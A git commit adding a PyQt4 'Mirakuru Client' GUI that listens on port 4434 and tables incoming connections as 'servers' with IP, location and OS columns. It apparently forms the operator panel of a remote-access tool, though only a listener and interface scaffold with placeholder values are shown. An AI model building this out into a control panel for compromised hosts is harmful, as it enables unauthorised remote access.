4a4250365ab9fd2014a707547646a1757959afd7
Swordf1sh <uripatton@gmail.com>
2015-11-22 18:53:41 +0400

    client update

---
+++ UPGRADE/main.py
@@ -0,0 +1,120 @@
+# -*- coding: utf-8 -*-
+
+import sys
+import socket
+from threading import Thread
+
+from PyQt4.QtGui import *
+from PyQt4.QtCore import *
+
+from ui import main_ui, res
+
+
+class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
+
+    def __init__(self, parent=None):
+        super(MainDialog, self).__init__(parent)
+        self.setupUi(self)
+
+        # sockets Timeout
+        self.timeout = None
+
+        # indexes for servers table
+        self.index_of_ipAddress = 0
+        self.index_of_location = 1
+        self.index_of_socket = 2
+        self.index_of_os = 3
+        self.index_for_table = 0
+
+
+        self.startListenButton.clicked.connect(self.startListen)
+
+
+    # Start Listen for Servers
+    def startListen(self):
+        # Initializing variables
+        self.socks = {}
+        self.acceptthreadState = True
+        self.listenthread = Thread(target=self.listenConnections, args=(4434,))
+        self.listenthread.setDaemon(True)
+        self.listenthread.start()
+
+
+    # listen for clients
+    # accept connections
+    # add to socketlist widget
+    def listenConnections(self, port):
+
+        # Initializing socket
+        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # telling the OS that you know what you're doing and you still want to bind to the same port
+        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        # Bind address
+        self.c.bind(('0.0.0.0', int(port)))
+
+        # Start listen for connections
+        self.c.listen(128)
+        while self.acceptthreadState == True:
+            try:
+
+                # Try accept connection
+                self.sock, self.address = self.c.accept()
+            except:
+
+                continue
+
+            if self.acceptthreadState == False:
+                return
+            if self.sock:
+
+                # Set timeout None
+                self.sock.settimeout(self.timeout)
+
+                # Save connected socket
+                socketIndex = self.address[1]
+                self.socks[socketIndex] = {}
+                self.socks[socketIndex]['sock'] = self.sock
+                self.socks[socketIndex]['ip_address'] = self.address[0]
+                self.socks[socketIndex]['socket'] = self.address[1]
+
+                self.updateServersTable()
+
+    # Update Servers Table from self.socks
+    def updateServersTable(self):
+        self.serversTable.setRowCount(len(self.socks))
+        for index, obj in enumerate(self.socks):
+            item = QTableWidgetItem(self.socks[obj]['ip_address'])
+            self.serversTable.setItem(index, self.index_of_ipAddress, item)
+            item = QTableWidgetItem('Georgia')
+            self.serversTable.setItem(index, self.index_of_location, item)
+            item = QTableWidgetItem(str(self.socks[obj]['socket']))
+            self.serversTable.setItem(index, self.index_of_socket, item)
+            item = QTableWidgetItem('Windows 7 Service pack 3')
+            self.serversTable.setItem(index, self.index_of_os, item)
+        print 'done'
+
+
+    # Stop Listen for Servers
+    def stopListen(self):
+        pass
+
+
+# Run Application
+def main():
+    app = QApplication(sys.argv)
+    # Initializing splashscreen
+    #splash_pix = QPixmap('assets/splash.png')
+    #splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
+    #splash.setMask(splash_pix.mask())
+    #splash.show()
+    #time.sleep(3)
+    # app.processEvents()
+    form = MainDialog()
+    form.show()
+    #splash.finish(form)
+    sys.exit(app.exec_())
+
+
+if __name__ == '__main__':
+    main()
---
+++ UPGRADE/ui/main_ui.py
@@ -0,0 +1,253 @@
+# -*- coding: utf-8 -*-
+
+# Form implementation generated from reading ui file 'gui.ui'
+#
+# Created by: PyQt4 UI code generator 4.11.4
+#
+# WARNING! All changes made in this file will be lost!
+
+from PyQt4 import QtCore, QtGui
+
+try:
+    _fromUtf8 = QtCore.QString.fromUtf8
+except AttributeError:
+    def _fromUtf8(s):
+        return s
+
+try:
+    _encoding = QtGui.QApplication.UnicodeUTF8
+    def _translate(context, text, disambig):
+        return QtGui.QApplication.translate(context, text, disambig, _encoding)
+except AttributeError:
+    def _translate(context, text, disambig):
+        return QtGui.QApplication.translate(context, text, disambig)
+
+class Ui_MainWindow(object):
+    def setupUi(self, MainWindow):
+        MainWindow.setObjectName(_fromUtf8("MainWindow"))
+        MainWindow.resize(791, 382)
+        MainWindow.setStyleSheet(_fromUtf8("background-color: #0F2D40;\n"
+"color: #2ecc71;\n"
+"border-radius: 3px;\n"
+"font: 10pt \"MS Shell Dlg 2\";"))
+        self.centralwidget = QtGui.QWidget(MainWindow)
+        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
+        self.gridLayout = QtGui.QGridLayout(self.centralwidget)
+        self.gridLayout.setObjectName(_fromUtf8("gridLayout"))
+        self.horizontalLayout = QtGui.QHBoxLayout()
+        self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
+        self.startListenButton = QtGui.QPushButton(self.centralwidget)
+        self.startListenButton.setMinimumSize(QtCore.QSize(32, 32))
+        self.startListenButton.setMaximumSize(QtCore.QSize(32, 32))
+        self.startListenButton.setStyleSheet(_fromUtf8("QPushButton#startListenButton {\n"
+"            background: #194759;\n"
+"            border: 1px outset;\n"
+"            border-color: #0F2D40;\n"
+"            text-decoration: none;\n"
+"            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #194759, stop:1 #225E75);\n"
+"            }\n"
+"\n"
+"QPushButton#startListenButton:pressed {\n"
+"            background: #194759;\n"
+"            border: 1px outset;\n"
+"            border-color: #0F2D40;\n"
+"            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #112F3B, stop:1 #1B4C5E);\n"
+"            }"))
+        self.startListenButton.setText(_fromUtf8(""))
+        icon = QtGui.QIcon()
+        icon.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/start.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.startListenButton.setIcon(icon)
+        self.startListenButton.setIconSize(QtCore.QSize(22, 22))
+        self.startListenButton.setObjectName(_fromUtf8("startListenButton"))
+        self.horizontalLayout.addWidget(self.startListenButton)
+        self.StopListenButton = QtGui.QPushButton(self.centralwidget)
+        self.StopListenButton.setMinimumSize(QtCore.QSize(32, 32))
+        self.StopListenButton.setMaximumSize(QtCore.QSize(32, 32))
+        self.StopListenButton.setStyleSheet(_fromUtf8("QPushButton#StopListenButton {\n"
+"            background: #194759;\n"
+"            border: 1px outset;\n"
+"            border-color: #0F2D40;\n"
+"            text-decoration: none;\n"
+"            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #194759, stop:1 #225E75);\n"
+"            }\n"
+"\n"
+"QPushButton#StopListenButton:pressed {\n"
+"            background: #194759;\n"
+"            border: 1px outset;\n"
+"            border-color: #0F2D40;\n"
+"            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #112F3B, stop:1 #1B4C5E);\n"
+"            }"))
+        self.StopListenButton.setText(_fromUtf8(""))
+        icon1 = QtGui.QIcon()
+        icon1.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/stop.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.StopListenButton.setIcon(icon1)
+        self.StopListenButton.setIconSize(QtCore.QSize(20, 20))
+        self.StopListenButton.setObjectName(_fromUtf8("StopListenButton"))
+        self.horizontalLayout.addWidget(self.StopListenButton)
+        spacerItem = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
+        self.horizontalLayout.addItem(spacerItem)
+        self.gridLayout.addLayout(self.horizontalLayout, 0, 0, 1, 1)
+        self.MainTabWidget = QtGui.QTabWidget(self.centralwidget)
+        self.MainTabWidget.setStyleSheet(_fromUtf8(" QTabBar::tab {\n"
+"  background-color: #194759;\n"
+"  color: white;\n"
+"  padding: 10px;\n"
+"  padding-left: 15px;\n"
+"  width: 70%;\n"
+"  border: 1px outset;\n"
+"  border-color: #0F2D40;\n"
+" }\n"
+"\n"
+" QTabBar::tab:selected {\n"
+"   background: #0F2D40;;\n"
+" }\n"
+"\n"
+" QTabBar::pane {\n"
+"   background-color: rgb(28, 29, 33);\n"
+" }\n"
+"\n"
+"QTabWidget::pane {\n"
+"    color: rgb(246, 246, 244);\n"
+"    margin: 0px,1px,1px,1px;\n"
+"    border: 1px ridge;\n"
+"    border-color: #0F2D40;\n"
+"    background-color: rgb(28, 29, 33);\n"
+"    background-position: center;\n"
+"      }"))
+        self.MainTabWidget.setObjectName(_fromUtf8("MainTabWidget"))
+        self.serversTab = QtGui.QWidget()
+        self.serversTab.setObjectName(_fromUtf8("serversTab"))
+        self.gridLayout_2 = QtGui.QGridLayout(self.serversTab)
+        self.gridLayout_2.setObjectName(_fromUtf8("gridLayout_2"))
+        self.serversTable = QtGui.QTableWidget(self.serversTab)
+        self.serversTable.setStyleSheet(_fromUtf8("QHeaderView::section {\n"
+"    background-color: #194759;\n"
+"    padding: 2px;\n"
+"}\n"
+"\n"
+"QTableWidget#serversTable {\n"
+"    background-position: center;\n"
+"    border: 1px outset;\n"
+"    border-color: #0F2D40;\n"
+"    border-radius: 2px;\n"
+"    background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #061014, stop:1 #050C0F);\n"
+"}\n"
+"\n"
+"QTableWidget#serversTable:item:selected {\n"
+"background-color: #194759;\n"
+"height: 50px;\n"
+"color: #2ecc71;\n"
+"border: none;\n"
+"}"))
+        self.serversTable.setFrameShadow(QtGui.QFrame.Plain)
+        self.serversTable.setEditTriggers(QtGui.QAbstractItemView.NoEditTriggers)
+        self.serversTable.setDragDropOverwriteMode(False)
+        self.serversTable.setSelectionMode(QtGui.QAbstractItemView.SingleSelection)
+        self.serversTable.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows)
+        self.serversTable.setTextElideMode(QtCore.Qt.ElideMiddle)
+        self.serversTable.setShowGrid(False)
+        self.serversTable.setObjectName(_fromUtf8("serversTable"))
+        self.serversTable.setColumnCount(4)
+        self.serversTable.setRowCount(0)
+        item = QtGui.QTableWidgetItem()
+        self.serversTable.setHorizontalHeaderItem(0, item)
+        item = QtGui.QTableWidgetItem()
+        self.serversTable.setHorizontalHeaderItem(1, item)
+        item = QtGui.QTableWidgetItem()
+        self.serversTable.setHorizontalHeaderItem(2, item)
+        item = QtGui.QTableWidgetItem()
+        self.serversTable.setHorizontalHeaderItem(3, item)
+        self.serversTable.horizontalHeader().setCascadingSectionResizes(True)
+        self.serversTable.horizontalHeader().setDefaultSectionSize(100)
+        self.serversTable.horizontalHeader().setSortIndicatorShown(False)
+        self.serversTable.horizontalHeader().setStretchLastSection(True)
+        self.serversTable.verticalHeader().setVisible(False)
+        self.gridLayout_2.addWidget(self.serversTable, 0, 0, 1, 1)
+        icon2 = QtGui.QIcon()
+        icon2.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/server.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.MainTabWidget.addTab(self.serversTab, icon2, _fromUtf8(""))
+        self.logsTab = QtGui.QWidget()
+        self.logsTab.setObjectName(_fromUtf8("logsTab"))
+        self.gridLayout_3 = QtGui.QGridLayout(self.logsTab)
+        self.gridLayout_3.setObjectName(_fromUtf8("gridLayout_3"))
+        self.textEdit = QtGui.QTextEdit(self.logsTab)
+        self.textEdit.setStyleSheet(_fromUtf8("background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #061014, stop:1 #050C0F);\n"
+"background-position: center;\n"
+"border: 1px ridge;\n"
+"border-color: #0F2D40;\n"
+"border-radius: 2px;"))
+        self.textEdit.setObjectName(_fromUtf8("textEdit"))
+        self.gridLayout_3.addWidget(self.textEdit, 0, 0, 1, 1)
+        icon3 = QtGui.QIcon()
+        icon3.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/log.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.MainTabWidget.addTab(self.logsTab, icon3, _fromUtf8(""))
+        self.gridLayout.addWidget(self.MainTabWidget, 1, 0, 1, 1)
+        MainWindow.setCentralWidget(self.centralwidget)
+        self.menubar = QtGui.QMenuBar(MainWindow)
+        self.menubar.setGeometry(QtCore.QRect(0, 0, 791, 24))
+        self.menubar.setStyleSheet(_fromUtf8("QMenuBar {\n"
+"            background-color: #0C2230;\n"
+"            color: rgb(255,255,255);\n"
+"            border: 1px solid #000;\n"
+"        }\n"
+"\n"
+"        QMenuBar::item {\n"
+"            background-color: #0C2230;\n"
+"            color: rgb(255,255,255);\n"
+"        }\n"
+"\n"
+"        QMenuBar::item::selected {\n"
+"            background-color: #0F2D40;\n"
+"        }\n"
+"\n"
+"        QMenu {\n"
+"            background-color: #0C2230;\n"
+"            color: rgb(255,255,255);\n"
+"            border: 1px solid #000;           \n"
+"        }\n"
+"\n"
+"        QMenu::item::selected {\n"
+"            background-color: #0F2D40;\n"
+"        }"))
+        self.menubar.setObjectName(_fromUtf8("menubar"))
+        self.menuClient = QtGui.QMenu(self.menubar)
+        self.menuClient.setObjectName(_fromUtf8("menuClient"))
+        MainWindow.setMenuBar(self.menubar)
+        self.statusbar = QtGui.QStatusBar(MainWindow)
+        self.statusbar.setObjectName(_fromUtf8("statusbar"))
+        MainWindow.setStatusBar(self.statusbar)
+        self.actionStartListen_for_connections = QtGui.QAction(MainWindow)
+        self.actionStartListen_for_connections.setObjectName(_fromUtf8("actionStartListen_for_connections"))
+        self.actionStopListen_for_connections = QtGui.QAction(MainWindow)
+        self.actionStopListen_for_connections.setObjectName(_fromUtf8("actionStopListen_for_connections"))
+        self.actionClient_Configuration = QtGui.QAction(MainWindow)
+        self.actionClient_Configuration.setObjectName(_fromUtf8("actionClient_Configuration"))
+        self.menuClient.addAction(self.actionStartListen_for_connections)
+        self.menuClient.addAction(self.actionStopListen_for_connections)
+        self.menuClient.addSeparator()
+        self.menuClient.addAction(self.actionClient_Configuration)
+        self.menubar.addAction(self.menuClient.menuAction())
+
+        self.retranslateUi(MainWindow)
+        self.MainTabWidget.setCurrentIndex(0)
+        QtCore.QMetaObject.connectSlotsByName(MainWindow)
+
+    def retranslateUi(self, MainWindow):
+        MainWindow.setWindowTitle(_translate("MainWindow", "Mirakuru Client", None))
+        self.serversTable.setSortingEnabled(True)
+        item = self.serversTable.horizontalHeaderItem(0)
+        item.setText(_translate("MainWindow", "Ip Address", None))
+        item = self.serversTable.horizontalHeaderItem(1)
+        item.setText(_translate("MainWindow", "Location", None))
+        item = self.serversTable.horizontalHeaderItem(2)
+        item.setText(_translate("MainWindow", "Socket", None))
+        item = self.serversTable.horizontalHeaderItem(3)
+        item.setText(_translate("MainWindow", "OS", None))
+        self.MainTabWidget.setTabText(self.MainTabWidget.indexOf(self.serversTab), _translate("MainWindow", "Servers", None))
+        self.MainTabWidget.setTabText(self.MainTabWidget.indexOf(self.logsTab), _translate("MainWindow", "Logs", None))
+        self.menuClient.setTitle(_translate("MainWindow", "Client", None))
+        self.actionStartListen_for_connections.setText(_translate("MainWindow", "Start Listening", None))
+        self.actionStopListen_for_connections.setText(_translate("MainWindow", "Stop Listening", None))
+        self.actionClient_Configuration.setText(_translate("MainWindow", "Client Configuration", None))
+
+import res
